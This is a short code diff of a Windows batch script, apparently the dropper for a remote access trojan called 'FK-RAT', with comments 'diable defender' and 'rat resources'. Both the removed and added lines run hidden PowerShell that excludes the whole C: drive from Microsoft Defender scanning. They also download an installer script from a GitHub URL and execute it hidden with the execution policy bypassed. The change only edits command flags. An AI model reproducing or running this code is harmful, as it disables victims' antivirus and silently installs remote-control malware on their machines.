@@ -32,6 +32,6 @@ if '%errorlevel%' NEQ '0' (
 REM diable defender
 
 REM rat resources
-powershell powershell.exe -windowstyle hidden "Add-MpPreference -ExclusionPath 'C:\' -Force -ea 0 | Out-Null";
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/installer.ps1 -OutFile installer.ps1";
-powershell Start-Process  powershell.exe -windowstyle hidden -ep bypass "installer.ps1"
+powershell powershell.exe -windowstyle hidden -c "Add-MpPreference -ExclusionPath 'C:\' -Force -ea 0 | Out-Null";
+powershell powershell.exe -windowstyle hidden -c "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/installer.ps1 -OutFile installer.ps1";
+powershell Start-Process  powershell.exe -windowstyle hidden -ExecutionPolicy bypass -c "installer.ps1"
